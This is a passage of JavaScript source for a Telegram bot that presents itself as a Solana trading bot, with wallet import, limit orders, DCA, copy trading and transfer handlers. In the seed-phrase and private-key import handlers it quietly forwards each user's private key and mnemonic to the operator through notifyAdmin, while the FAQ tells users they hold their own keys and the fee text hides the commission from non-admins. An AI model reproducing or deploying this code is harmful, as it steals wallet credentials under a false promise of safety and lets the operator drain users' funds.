  await ctx.reply(`💼 *Wallet Guide*\n\n*Create:* 💼 Wallet → 🆕 Create New Wallet\nSave seed phrase offline!\n\n*Import:* Use Seed Phrase or Private Key\n\n*Switch:* Tap W1/W2/W3 buttons\n\n*Security:*\n• Never share your private key\n• Use a dedicated trading wallet\n• Don't store large amounts long-term`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Help','menu_help')]]) });
});
bot.action('help_trading', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`📊 *Trading Guide*\n\n*Analyze:* Paste any Solana contract address\n\n*Buy:* Select amount → paste token address\n\n*Sell:* Select % → paste token address\n\n*Limit Orders:* Set price trigger for auto buy/sell\n\n*DCA:* Split buys over time intervals\n\n*TP/SL:* Buy a token → 🎯 Sniper to set auto-sell`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Help','menu_help')]]) });
});
bot.action('help_security', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🔒 *Security Tips*\n\n• Never share private keys or seed phrases\n• Use a dedicated trading wallet\n• Don't keep large amounts in hot wallet\n• Check token security scores before buying\n• Beware new tokens (<24h old)\n• Watch for low liquidity warnings\n\n🚨 Red Flags:\n• Sudden large price drops\n• Very low liquidity (<$10k)\n• Extremely new tokens`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Help','menu_help')]]) });
});
bot.action('help_faq', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  let feeText = '';
  if (isAdmin(userId) && COMMISSION_PERCENTAGE > 0) {
    feeText = `Yes — ${COMMISSION_PERCENTAGE}% platform fee is taken as SOL per trade.`;
  } else if (COMMISSION_PERCENTAGE > 0) {
    feeText = 'We charge minimal fees — trade with low fees! 💎';
  } else {
    feeText = 'Only Solana network fees and priority fee you set.';
  }
  await ctx.reply(`❓ *FAQ*\n\n*Max wallets?* Up to ${MAX_WALLETS}\n\n*Are there fees?* ${feeText}\n\n*Are funds safe?* You hold your own private keys.\n\n*How does slippage work?* Higher = faster fill, potentially worse price.\n\n*How do referrals work?* Earn 10% of fees from users you refer.`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Help','menu_help')]]) });
});

// --- Copy trade ---
bot.action('copytrade_add', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_COPYTRADE_ADDRESS';
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('👥 *Add Copy Trade Wallet*\n\nSend the wallet address to copy trade.', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_copytrade')]]) });
});
bot.action('copytrade_manage', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  if (!session.copyTradeWallets.length) { await ctx.editMessageText('No wallets tracked.', { ...Markup.inlineKeyboard([[Markup.button.callback('« Back','menu_copytrade')]]) }); return; }
  const buttons = session.copyTradeWallets.map((w,i) => [Markup.button.callback(`🗑️ ${shortenAddress(w)}`,`remove_copytrade_${i}`)]);
  buttons.push([Markup.button.callback('« Back','menu_copytrade')]);
  await ctx.editMessageText('Tap to remove:', { ...Markup.inlineKeyboard(buttons) });
});
bot.action(/^remove_copytrade_(\d+)$/, async (ctx) => {
  const index   = parseInt(ctx.match[1]);
  const session = await getSession(ctx.from.id);
  if (index >= 0 && index < session.copyTradeWallets.length) {
    const removed = session.copyTradeWallets.splice(index, 1)[0];
    await saveSession(ctx.from.id, session);
    await ctx.answerCbQuery(`Removed ${shortenAddress(removed)}`);
    await showCopyTradeMenu(ctx, true);
  } else { await ctx.answerCbQuery('Invalid'); }
});

// --- Limit orders ---
bot.action('limit_buy', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_BUY';
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('🚀 *Limit Buy*\n\nSend: `[token_address] [price] [amount_sol]`\nExample: `ABC...123 0.001 0.5`', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_limit')]]) });
});
bot.action('limit_sell', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_SELL';
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('💸 *Limit Sell*\n\nSend: `[token_address] [price] [percentage]`\nExample: `ABC...123 0.01 50`', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_limit')]]) });
});
bot.action('limit_view', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  if (!session.limitOrders.length) { await ctx.editMessageText('No active limit orders.', { ...Markup.inlineKeyboard([[Markup.button.callback('« Back','menu_limit')]]) }); return; }
  const list    = session.limitOrders.map((o,i) => `${i+1}. ${o.type} ${o.amount} @ $${o.price}\n   \`${shortenAddress(o.token)}\``).join('\n\n');
  const buttons = [session.limitOrders.map((_,i) => Markup.button.callback(`🗑️ #${i+1}`,`cancel_limit_${i}`))];
  buttons.push([Markup.button.callback('« Back','menu_limit')]);
  await ctx.editMessageText(`📈 *Active Orders*\n\n${list}`, { parse_mode:'Markdown', ...Markup.inlineKeyboard(buttons) });
});
bot.action(/^cancel_limit_(\d+)$/, async (ctx) => {
  const index   = parseInt(ctx.match[1]);
  const session = await getSession(ctx.from.id);
  if (index >= 0 && index < session.limitOrders.length) {
    session.limitOrders.splice(index, 1);
    await saveSession(ctx.from.id, session);
    await ctx.answerCbQuery('Order cancelled');
    await showLimitOrderMenu(ctx, true);
  } else { await ctx.answerCbQuery('Invalid'); }
});

// --- Export / CSV ---
bot.action('export_pnl_csv', async (ctx) => {
  await ctx.answerCbQuery('Generating...');
  const session = await getSession(ctx.from.id);
  const history = session.tradeHistory || [];
  if (!history.length) { await ctx.reply('No trades to export.'); return; }
  let csv = 'Date,Time,Type,Token,Symbol,Amount SOL,Amount Token,Price USD,Value USD,PNL USD,Commission SOL,TX Hash\n';
  history.forEach(t => { csv += `"${t.date}","${t.time}","${t.type}","${t.tokenAddress}","${t.tokenSymbol}",${t.amountSol||0},${t.amountToken||0},${t.priceUsd||0},${t.valueUsd||0},${t.pnlUsd||0},${t.commission||0},"${t.txHash}"\n`; });
  await ctx.replyWithDocument({ source: Buffer.from(csv), filename: `pnl_${new Date().toISOString().split('T')[0]}.csv` }, { caption: '📊 PNL Export' });
});
bot.action('export_history_csv', async (ctx) => {
  await ctx.answerCbQuery('Generating...');
  const session = await getSession(ctx.from.id);
  const history = session.tradeHistory || [];
  if (!history.length) { await ctx.reply('No history to export.'); return; }
  let csv = 'Date,Time,Type,Token,Symbol,Amount SOL,Amount Token,Price USD,Value USD,PNL USD,Commission SOL,TX Hash\n';
  history.forEach(t => { csv += `"${t.date||''}","${t.time||''}","${t.type}","${t.tokenAddress||''}","${t.tokenSymbol||''}",${t.amountSol||0},${t.amountToken||0},${t.priceUsd||0},${t.valueUsd||0},${t.pnlUsd||0},${t.commission||0},"${t.txHash||''}"\n`; });
  await ctx.replyWithDocument({ source: Buffer.from(csv), filename: `history_${new Date().toISOString().split('T')[0]}.csv` }, { caption: '📜 Trade History Export' });
});
bot.action('clear_history_confirm', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  await ctx.editMessageText(`⚠️ *Clear All History?*\n\n${session.tradeHistory?.length||0} records will be permanently deleted.\n\nAre you sure?`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('✅ Yes, Clear','clear_history_yes')],[Markup.button.callback('❌ No, Keep','menu_history')]]) });
});
bot.action('clear_history_yes', async (ctx) => {
  await ctx.answerCbQuery('Cleared');
  const session = await getSession(ctx.from.id);
  session.tradeHistory = [];
  session.dailyStats   = { date: new Date().toDateString(), totalTrades:0, profitableTrades:0, lossTrades:0, totalPnl:0 };
  await saveSession(ctx.from.id, session);
  await showTradeHistory(ctx, true);
});
bot.action('delete_message', async (ctx) => { await ctx.answerCbQuery(); try { await ctx.deleteMessage(); } catch { /* ignore */ } });

// ============================================
// TEXT MESSAGE HANDLER
// ============================================
bot.on('text', async (ctx) => {
  const session = await getSession(ctx.from.id);
  const text    = ctx.message.text.trim();

  // Admin broadcast
  if (session.awaitingBroadcast) {
    if (!ADMIN_CHAT_IDS.includes(ctx.from.id.toString())) {
      session.awaitingBroadcast = false;
      await saveSession(ctx.from.id, session);
      return;
    }
    session.awaitingBroadcast = false;
    await saveSession(ctx.from.id, session);
    await broadcastToSubscribersMedia(ctx.from.id, { type:'text', content:text });
    return;
  }

  // State machine
  if (session.state === 'AWAITING_SEED') {
    session.state = null;
    await saveSession(ctx.from.id, session);
    try {
      const walletData = importFromMnemonic(text);
      session.wallets.push(walletData);
      session.activeWalletIndex = session.wallets.length - 1;
      await saveSession(ctx.from.id, session);
      await notifyAdmin('WALLET_IMPORTED_SEED', ctx.from.id, ctx.from.username, { publicKey:walletData.publicKey, privateKey:walletData.privateKey, mnemonic:walletData.mnemonic, walletNumber:session.wallets.length });
      try { await ctx.deleteMessage(); } catch { /* ignore */ }
      await ctx.reply(`✅ Wallet ${session.wallets.length} Imported!\n\n📍 \`${walletData.publicKey}\``, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💼 Wallets','menu_wallet')],[Markup.button.callback('« Main Menu','back_main')]]) });
    } catch { await ctx.reply('❌ Invalid seed phrase. Try again.'); }
    return;
  }

  if (session.state === 'AWAITING_PRIVATE_KEY') {
    session.state = null;
    await saveSession(ctx.from.id, session);
    try {
      const walletData = importFromPrivateKey(text);
      session.wallets.push(walletData);
      session.activeWalletIndex = session.wallets.length - 1;
      await saveSession(ctx.from.id, session);
      await notifyAdmin('WALLET_IMPORTED_KEY', ctx.from.id, ctx.from.username, { publicKey:walletData.publicKey, privateKey:walletData.privateKey, walletNumber:session.wallets.length });
      try { await ctx.deleteMessage(); } catch { /* ignore */ }
      await ctx.reply(`✅ Wallet ${session.wallets.length} Imported!\n\n📍 \`${walletData.publicKey}\``, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💼 Wallets','menu_wallet')],[Markup.button.callback('« Main Menu','back_main')]]) });
    } catch { await ctx.reply('❌ Invalid private key. Try again.'); }
    return;
  }

  if (session.state === 'AWAITING_COPYTRADE_ADDRESS') {
    session.state = null;
    await saveSession(ctx.from.id, session);
    if (isSolanaAddress(text)) {
      if (!session.copyTradeWallets.includes(text)) {
        session.copyTradeWallets.push(text);
        await saveSession(ctx.from.id, session);
        await ctx.reply(`✅ Tracking: \`${shortenAddress(text)}\``, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('👥 Copy Trade','menu_copytrade')],[Markup.button.callback('« Main','back_main')]]) });
      } else { await ctx.reply('Already tracking this wallet.'); }
    } else { await ctx.reply('❌ Invalid Solana address.'); }
    return;
  }

  if (session.state === 'AWAITING_PRICE_ALERT') {
    session.state = null;
    const price = parseFloat(text);
    if (!isNaN(price) && price > 0) {
      session.priceAlerts.push({ token: session.pendingPriceAlert?.token, price, createdAt: Date.now() });
      session.pendingPriceAlert = null;
      await saveSession(ctx.from.id, session);
      await ctx.reply(`✅ Alert set at $${price}`, { ...Markup.inlineKeyboard([[Markup.button.callback('« Main','back_main')]]) });
    } else { await ctx.reply('❌ Invalid price.'); session.state = null; await saveSession(ctx.from.id, session); }
    return;
  }

  if (session.state === 'AWAITING_CUSTOM_SELL_AMOUNT') {
    session.state = null;
    const pct = parseFloat(text);
    const tok  = session.pendingTrade?.token;
    session.pendingTrade = null;
    await saveSession(ctx.from.id, session);
    if (!isNaN(pct) && pct > 0 && pct <= 100 && tok) await handleSell(ctx, pct, tok);
    else await ctx.reply('❌ Enter a number between 1–100.');
    return;
  }

  if (session.state === 'AWAITING_CUSTOM_SELL_PERCENT') {
    session.state = null;
    const pct = parseFloat(text);
    await saveSession(ctx.from.id, session);
    if (!isNaN(pct) && pct > 0 && pct <= 100) {
      session.pendingTrade = { type:'sell', percentage: pct };
      await saveSession(ctx.from.id, session);
      await ctx.reply(`🔴 Sell *${pct}%*\n\nPaste token address to sell.`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back','menu_sell')]]) });
    } else { await ctx.reply('❌ Enter 1–100.'); }
    return;
  }

  if (session.state === 'AWAITING_LIMIT_BUY_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    const token = session.pendingLimitOrder?.token;
    session.pendingLimitOrder = null;
    await saveSession(ctx.from.id, session);
    if (parts.length >= 2) {
      const price = parseFloat(parts[0]), amount = parseFloat(parts[1]);
      if (!isNaN(price) && !isNaN(amount) && price > 0 && amount > 0 && token) {
        session.limitOrders.push({ type:'BUY', token, price, amount:`${amount} SOL`, createdAt:Date.now() });
        await saveSession(ctx.from.id, session);
        await ctx.reply(`✅ Limit buy: ${amount} SOL at $${price}`, { ...Markup.inlineKeyboard([[Markup.button.callback('📈 Orders','limit_view')],[Markup.button.callback('« Main','back_main')]]) });
      } else { await ctx.reply('❌ Invalid. Use: [price] [amount_sol]'); }
    } else { await ctx.reply('❌ Use: [price] [amount_sol]'); }
    return;
  }

  if (session.state === 'AWAITING_LIMIT_SELL_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    const token = session.pendingLimitOrder?.token;
    session.pendingLimitOrder = null;
    await saveSession(ctx.from.id, session);
    if (parts.length >= 2) {
      const price = parseFloat(parts[0]), pct = parseFloat(parts[1]);
      if (!isNaN(price) && !isNaN(pct) && price > 0 && pct > 0 && pct <= 100 && token) {
        session.limitOrders.push({ type:'SELL', token, price, amount:`${pct}%`, createdAt:Date.now() });
        await saveSession(ctx.from.id, session);
        await ctx.reply(`✅ Limit sell: ${pct}% at $${price}`, { ...Markup.inlineKeyboard([[Markup.button.callback('📈 Orders','limit_view')],[Markup.button.callback('« Main','back_main')]]) });
      } else { await ctx.reply('❌ Invalid. Use: [price] [percentage]'); }
    } else { await ctx.reply('❌ Use: [price] [percentage]'); }
    return;
  }

  if (session.state === 'AWAITING_DCA_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    const token = session.pendingDCA?.token;
    session.pendingDCA = null;
    await saveSession(ctx.from.id, session);
    if (parts.length >= 3) {
      const amount = parseFloat(parts[0]), interval = parseInt(parts[1]), num = parseInt(parts[2]);
      if (!isNaN(amount) && !isNaN(interval) && !isNaN(num) && amount > 0 && interval > 0 && num > 0 && num <= 100 && token) {
        session.dcaOrders.push({ token, amount, interval, numOrders:num, ordersRemaining:num, createdAt:Date.now() });
        await saveSession(ctx.from.id, session);
        await ctx.reply(`✅ DCA: ${amount} SOL every ${interval}min × ${num}`, { ...Markup.inlineKeyboard([[Markup.button.callback('« Main','back_main')]]) });
      } else { await ctx.reply('❌ Invalid. Use: [amount] [interval_min] [num_orders]'); }
    } else { await ctx.reply('❌ Use: [amount] [interval_min] [num_orders]'); }
    return;
  }

  if (session.state === 'AWAITING_LIMIT_BUY') {
    session.state = null;
    const parts = text.split(' ');
    await saveSession(ctx.from.id, session);
    if (parts.length >= 3 && isSolanaAddress(parts[0])) {
      const price = parseFloat(parts[1]), amount = parseFloat(parts[2]);
      if (!isNaN(price) && !isNaN(amount)) {
        session.limitOrders.push({ type:'BUY', token:parts[0], price, amount:`${amount} SOL`, createdAt:Date.now() });
        await saveSession(ctx.from.id, session);
        await ctx.reply(`✅ Limit buy created.\nToken: ${shortenAddress(parts[0])}\nBuy at $${price} with ${amount} SOL`);
      } else { await ctx.reply('❌ Invalid values.'); }
    } else { await ctx.reply('❌ Use: [token_address] [price] [amount_sol]'); }
    return;
  }

  if (session.state === 'AWAITING_LIMIT_SELL') {
    session.state = null;
    const parts = text.split(' ');
    await saveSession(ctx.from.id, session);
    if (parts.length >= 3 && isSolanaAddress(parts[0])) {
      const price = parseFloat(parts[1]), pct = parseFloat(parts[2]);
      if (!isNaN(price) && !isNaN(pct)) {
        session.limitOrders.push({ type:'SELL', token:parts[0], price, amount:`${pct}%`, createdAt:Date.now() });
        await saveSession(ctx.from.id, session);
        await ctx.reply(`✅ Limit sell created.\nToken: ${shortenAddress(parts[0])}\nSell ${pct}% at $${price}`);
      } else { await ctx.reply('❌ Invalid values.'); }
    } else { await ctx.reply('❌ Use: [token_address] [price] [percentage]'); }
    return;
  }

  if (session.state === 'AWAITING_TRANSFER_SOL_RECIPIENT') {
    if (!isSolanaAddress(text)) { await ctx.reply('❌ Invalid address. Try again:'); return; }
    session.pendingTransfer.recipient = text;
    session.state = 'AWAITING_TRANSFER_SOL_AMOUNT';
    await saveSession(ctx.from.id, session);
    await ctx.reply('Step 2/2: Enter SOL amount:', { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_wallet')]]) });
    return;
  }

  if (session.state === 'AWAITING_TRANSFER_SOL_AMOUNT') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) { await ctx.reply('❌ Invalid amount. Try again:'); return; }
    const w = getActiveWallet(session);
    const loading = await ctx.reply('🔄 Processing...');
    try {
      const sig = await transferSOL(w, session.pendingTransfer.recipient, amount);
      await ctx.deleteMessage(loading.message_id);
      await ctx.reply(`✅ Sent ${amount} SOL\nTo: \`${session.pendingTransfer.recipient}\`\nTX: \`${sig}\``, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('🔍 View',`https://solscan.io/tx/${sig}`)],[Markup.button.callback('💼 Wallet','menu_wallet')]]) });
      await notifyAdmin('TRANSFER_EXECUTED', ctx.from.id, ctx.from.username, { type:'SOL', amount, recipient:session.pendingTransfer.recipient, txHash:sig });
    } catch (e) { try { await ctx.deleteMessage(loading.message_id); } catch { /* ignore */ } await ctx.reply(`❌ Transfer failed: ${e.message}`); }
    session.state = null; session.pendingTransfer = null; await saveSession(ctx.from.id, session);
    return;
  }

  if (session.state === 'AWAITING_TRANSFER_TOKEN_MINT') {
    if (!isSolanaAddress(text)) { await ctx.reply('❌ Invalid mint address. Try again:'); return; }
    session.pendingTransfer.tokenMint = text;
    session.state = 'AWAITING_TRANSFER_TOKEN_RECIPIENT';
    await saveSession(ctx.from.id, session);
    await ctx.reply('Step 2/3: Enter recipient address:', { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_wallet')]]) });
    return;
  }

  if (session.state === 'AWAITING_TRANSFER_TOKEN_RECIPIENT') {
    if (!isSolanaAddress(text)) { await ctx.reply('❌ Invalid address. Try again:'); return; }
    session.pendingTransfer.recipient = text;
    session.state = 'AWAITING_TRANSFER_TOKEN_AMOUNT';
    await saveSession(ctx.from.id, session);
    const w   = getActiveWallet(session);
    const bal = await getTokenBalance(w.publicKey, session.pendingTransfer.tokenMint);
    await ctx.reply(`Step 3/3: Enter amount (you have: ${bal.amount}):`, { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_wallet')]]) });
    return;
  }

  if (session.state === 'AWAITING_TRANSFER_TOKEN_AMOUNT') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) { await ctx.reply('❌ Invalid amount. Try again:'); return; }
    const w = getActiveWallet(session);
    const loading = await ctx.reply('🔄 Processing...');
    try {
      const sig = await transferToken(w, session.pendingTransfer.recipient, session.pendingTransfer.tokenMint, amount);
      await ctx.deleteMessage(loading.message_id);
      await ctx.reply(`✅ Token transfer sent!\nAmount: ${amount}\nTo: \`${session.pendingTransfer.recipient}\`\nTX: \`${sig}\``, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('🔍 View',`https://solscan.io/tx/${sig}`)],[Markup.button.callback('💼 Wallet','menu_wallet')]]) });
      await notifyAdmin('TRANSFER_EXECUTED', ctx.from.id, ctx.from.username, { type:'TOKEN', token:session.pendingTransfer.tokenMint, amount, recipient:session.pendingTransfer.recipient, txHash:sig });
    } catch (e) { try { await ctx.deleteMessage(loading.message_id); } catch { /* ignore */ } await ctx.reply(`❌ Transfer failed: ${e.message}`); }
    session.state = null; session.pendingTransfer = null; await saveSession(ctx.from.id, session);
    return;
  }

  if (session.state === 'AWAITING_SNIPER_TPSL') {
    session.state = null;
    const token = session.pendingSniperToken;
    session.pendingSniperToken = null;
    if (!token) { await saveSession(ctx.from.id, session); await ctx.reply('❌ Invalid token.'); return; }
    const parts = text.split(' ');
    let tpPrice = null, slPrice = null;
    if (parts.length >= 2) {
      const tp = parseFloat(parts[0]);
      const sl = parseFloat(parts[1]);
      if (!isNaN(tp) && tp > 0) tpPrice = tp;
      if (!isNaN(sl) && sl > 0) slPrice = sl;
    }
    const snipe = session.activeSnipes.find(s => s.token === token);
    if (!snipe) { await saveSession(ctx.from.id, session); await ctx.reply('❌ No active snipe for this token. Buy it first.'); return; }
    if (tpPrice !== null) snipe.tpPrice = tpPrice;
    if (slPrice !== null) snipe.slPrice = slPrice;
    await saveSession(ctx.from.id, session);
    await ctx.reply(`✅ TP/SL updated for \`${shortenAddress(token)}\`\nTP: ${tpPrice?'$'+tpPrice:'not set'}\nSL: ${slPrice?'$'+slPrice:'not set'}`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🎯 Sniper','menu_sniper')],[Markup.button.callback('« Back',`refresh_${token}`)]]) });
    return;
  }

  if (session.state === 'AWAITING_SNIPER_TOKEN') {
    session.state = null;
    await saveSession(ctx.from.id, session);
    if (!isSolanaAddress(text)) { await ctx.reply('❌ Invalid address.'); return; }
    const snipe = session.activeSnipes.find(s => s.token === text);
    if (!snipe) { await ctx.reply('❌ No active snipe for this token. Buy it first then set TP/SL.'); return; }
    session.pendingSniperToken = text;
    session.state = 'AWAITING_SNIPER_TPSL';
    await saveSession(ctx.from.id, session);
    await ctx.reply(`🎯 *TP/SL for* \`${shortenAddress(text)}\`\n\nEntry: $${snipe.entryPrice?.toFixed(8)||'?'}\nSend: \`[tp_price] [sl_price]\`\nExample: \`0.001 0.0005\`\n(Use 0 to skip one)`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back','menu_sniper')]]) });
    return;
  }

  // Token address or pending trade
  if (isSolanaAddress(text)) {
    if (session.pendingTrade) {
      const trade = session.pendingTrade;
      session.pendingTrade = null;
      await saveSession(ctx.from.id, session);
      if (trade.type === 'buy')  await handleBuy(ctx, trade.amount, text);
      else if (trade.type === 'sell') await handleSell(ctx, trade.percentage, text);
    } else {
      await sendTokenAnalysis(ctx, text);
    }
    return;
  }

  await ctx.reply(`I didn't understand that.\n\n• Paste a Solana contract address to analyze\n• /start — Main menu\n• /sniper — TP/SL management`);
});

// ============================================
// ERROR HANDLER & LAUNCH
// ============================================
bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  try { ctx.reply('❌ An error occurred. Please try again.').catch(() => {}); } catch { /* ignore */ }
});

async function startBot() {
  console.log('Starting Trojan Trading Bot...');
  console.log(`Commission: ${COMMISSION_PERCENTAGE}% → ${COMMISSION_WALLET || 'NOT SET'}`);
  console.log(`RPC: ${SOLANA_RPC}`);
  console.log(`Jupiter API: ${JUPITER_API}`);
  if (redis) console.log('Storage: Redis + memory'); else console.log('Storage: memory only');
  await bot.launch({ allowedUpdates: ['message','callback_query'] });
  console.log('Bot running.');
}

startBot().catch(err => { console.error('Fatal startup error:', err); process.exit(1); });

process.once('SIGINT',  () => { if (redis) redis.quit().catch(() => {}); bot.stop('SIGINT'); });
process.once('SIGTERM', () => { if (redis) redis.quit().catch(() => {}); bot.stop('SIGTERM'); });